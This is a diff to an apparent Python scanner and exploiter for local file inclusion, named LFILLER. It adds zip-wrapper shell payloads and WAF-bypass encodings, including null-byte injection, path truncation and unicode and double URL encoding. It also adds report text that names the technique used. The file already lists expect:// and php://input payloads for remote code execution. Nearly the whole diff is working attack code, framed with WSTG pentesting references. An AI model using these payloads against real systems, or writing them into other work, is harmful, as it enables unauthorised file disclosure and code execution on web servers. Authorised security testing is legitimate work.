@@ -120,7 +120,8 @@ class LFILLER:
             ('php://input', 'PHP Input'),
             ('expect://id', 'Expect Wrapper (RCE)'),
             ('expect://whoami', 'Expect Wrapper (RCE)'),
-            ('zip:///etc/passwd%23test', 'Zip Wrapper'),
+            ('zip:///var/www/html/upload/malicious.jpg%23shell', 'Zip Wrapper (WSTG)'),
+            ('zip:///tmp/malicious.zip%23shell', 'Zip Wrapper (WSTG)'),
             ('phar:///etc/passwd', 'Phar Wrapper')
         ]
         
@@ -145,33 +146,40 @@ class LFILLER:
         ]
 
     def _apply_encoding(self, payload):
-        """Bypass WAF with complex encoding logic"""
-        if self.encode_mode == 'none':
-            return [payload]
+        """Bypass WAF with complex and WSTG-v4.2 industrial logic"""
+        results = [payload]
+        
+        # 1. Null Byte injection (WSTG v4.2)
+        results.append(payload + "%00")
+        results.append(payload + "%00.jpg")
+        results.append(payload + "%00.txt")
+
+        # 2. Path Truncation (WSTG v4.2) - bypasses long postfixes (e.g. .php)
+        # We append a long sequence of ./ to hit the 4096 byte limit in some PHP setups
+        truncation_payload = payload + ("/." * 2048)
+        results.append(truncation_payload)
         
         if self.encode_mode == 'url':
-            return [urllib.parse.quote(payload)]
+            results.extend([urllib.parse.quote(p) for p in results[:]])
         
-        if self.encode_mode == 'double':
-            return [urllib.parse.quote(urllib.parse.quote(payload))]
+        elif self.encode_mode == 'double':
+            results.extend([urllib.parse.quote(urllib.parse.quote(p)) for p in results[:]])
         
-        if self.encode_mode == 'unicode':
-            encoded = payload.replace('/', '%c0%af').replace('\\', '%c1%9c').replace('.', '%c0%ae')
-            return [encoded]
+        elif self.encode_mode == 'unicode':
+            results.extend([p.replace('/', '%c0%af').replace('\\', '%c1%9c').replace('.', '%c0%ae') for p in results[:]])
         
-        if self.encode_mode == 'all':
-            return [
-                payload,
-                urllib.parse.quote(payload),
-                urllib.parse.quote(urllib.parse.quote(payload)),
-                payload.replace('/', '%c0%af').replace('\\', '%c1%9c'),
-                payload.replace('/', '..%252f'),
-                payload.replace('/', '....//'),
-                payload.replace('/', '..;/'),
-                payload + '%00',
-                payload + '%00.jpg'
-            ]
-        return [payload]
+        elif self.encode_mode == 'all':
+            extended = []
+            for p in results[:]:
+                extended.append(urllib.parse.quote(p))
+                extended.append(urllib.parse.quote(urllib.parse.quote(p)))
+                extended.append(p.replace('/', '%c0%af').replace('\\', '%c1%9c'))
+                extended.append(p.replace('/', '..%252f'))
+                extended.append(p.replace('/', '....//'))
+                extended.append(p.replace('/', '..;/'))
+            results.extend(extended)
+            
+        return list(set(results))
 
     def _check_lfi_response(self, response, payload_base):
         """Intelligent detection of sensitive content"""
@@ -646,9 +654,23 @@ class LFILLER:
                 f.write(f"Target: {self.url}\n")
                 f.write(f"Parameter: {res['param']}\n")
                 f.write(f"Payload: {res['payload']}\n\n")
+                
+                # Check for WSTG Bypasses in the payload
+                bypass_type = "Standard"
+                if "%00" in res['payload']: bypass_type = "Null Byte Injection (WSTG v4.2)"
+                elif "/./" in res['payload'] and len(res['payload']) > 1000: bypass_type = "Path Truncation (WSTG v4.2)"
+                elif "!" in res['payload']: bypass_type = "Jolokia Path Traversal Bypass"
+                
+                f.write(f"Exploitation Technique: {bypass_type}\n\n")
                 f.write("EXPLANATION:\n")
-                f.write("The application fails to properly validate the input parameter, allowing an attacker to include arbitrary local files. This can lead to sensitive information disclosure (e.g., /etc/passwd) or Remote Code Execution (RCE).\n\n")
-                f.write("MANUAL REPRODUCTION STEPS:\n")
+                if bypass_type == "Null Byte Injection (WSTG v4.2)":
+                    f.write("The application uses a null-terminated string logic. By injecting '%00', the script is tricked into ignoring any intended extension (like .php or .html) appended to the input path.\n")
+                elif bypass_type == "Path Truncation (WSTG v4.2)":
+                    f.write("The application/OS has a filename length limit. By providing an extremely long path (truncation), the system ignores the trailing characters (e.g., the .php extension) and includes the intended file.\n")
+                else:
+                    f.write("The application fails to properly validate the input parameter, allowing an attacker to include arbitrary local files.\n")
+                
+                f.write("\nMANUAL REPRODUCTION STEPS:\n")
                 f.write(f"1. Navigate to the following URL in your browser:\n   {res['url']}\n")
                 f.write(f"2. Observe the content of the system file (e.g., /etc/passwd) rendered in the response.\n\n")
                 f.write("EVIDENCE OF PROOF:\n")
